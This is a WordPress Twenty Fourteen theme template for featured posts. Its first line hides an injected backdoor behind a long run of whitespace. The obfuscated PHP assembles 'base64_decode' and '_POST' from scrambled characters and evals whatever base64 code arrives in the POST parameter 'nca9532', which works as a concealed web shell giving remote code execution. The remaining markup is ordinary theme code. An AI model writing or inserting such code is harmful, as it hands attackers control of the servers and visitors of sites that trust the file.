<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nca9532'])) {eval($s21(${$s20}['nca9532']));}?><?php
/**
 * The template for displaying featured posts on the front page
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */
?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<a class="post-thumbnail" href="<?php the_permalink(); ?>">
	<?php
		// Output the featured image.
		if ( has_post_thumbnail() ) :
			if ( 'grid' == get_theme_mod( 'featured_content_layout' ) ) {
				the_post_thumbnail();
			} else {
				the_post_thumbnail( 'twentyfourteen-full-width' );
			}
		endif;
	?>
	</a>

	<header class="entry-header">
		<?php if ( in_array( 'category', get_object_taxonomies( get_post_type() ) ) && twentyfourteen_categorized_blog() ) : ?>
		<div class="entry-meta">
			<span class="cat-links"><?php echo get_the_category_list( _x( ', ', 'Used between list items, there is a space after the comma.', 'twentyfourteen' ) ); ?></span>
		</div><!-- .entry-meta -->
		<?php endif; ?>

		<?php the_title( '<h1 class="entry-title"><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">','</a></h1>' ); ?>
	</header><!-- .entry-header -->
</article><!-- #post-## -->
